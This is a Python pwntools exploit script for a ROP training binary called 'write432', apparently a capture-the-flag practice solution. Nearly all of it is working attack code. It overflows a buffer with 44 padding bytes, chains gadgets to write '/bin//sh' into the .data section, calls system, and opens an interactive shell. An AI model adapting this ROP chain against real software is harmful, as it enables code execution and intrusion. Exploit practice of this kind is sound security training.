from pwn import *

# readable and writeable Sections
#Nm Paddr       Size Vaddr      Memsz Perms Name
#19 0x00000f08     4 0x08049f08     4 -rw- .init_array
#20 0x00000f0c     4 0x08049f0c     4 -rw- .fini_array
#21 0x00000f10     4 0x08049f10     4 -rw- .jcr
#22 0x00000f14   232 0x08049f14   232 -rw- .dynamic <<<< cannot write into the largest segment ????
#23 0x00000ffc     4 0x08049ffc     4 -rw- .got
#24 0x00001000    40 0x0804a000    40 -rw- .got.plt
#25 0x00001028     8 0x0804a028     8 -rw- .data
#26 0x00001030     0 0x0804a040    44 -rw- .bss

# We will write memory to -> Section.data /bin//sh is exactly 8 bytes
write_to = 0x0804a028

#  0x08048670               892f  mov dword [edi], ebp
#  0x08048672                 c3  ret
mov_ebp_edi_pointer = 0x08048670

#  0x080486da                 5f  pop edi
#  0x080486db                 5d  pop ebp
#  0x080486dc                 c3  ret
pop_edi_ebp = 0x080486da

write432 = ELF('write432')

rop_chain = "Z"*44

# prime registers for memory corruption fun
rop_chain += p32(pop_edi_ebp)
rop_chain += p32(write_to)
rop_chain += "/bin"
rop_chain += p32(mov_ebp_edi_pointer)

rop_chain += p32(pop_edi_ebp)
rop_chain += p32(write_to+4)
rop_chain += "//sh"
rop_chain += p32(mov_ebp_edi_pointer)

# call system
# 0x08048430    1 6            sym.imp.system
rop_chain += p32(0x08048430)
rop_chain += p32(write_to)
rop_chain += p32(write_to)

p = process(write432.path)
p.recvuntil('> ')
p.sendline(rop_chain)
p.interactive()
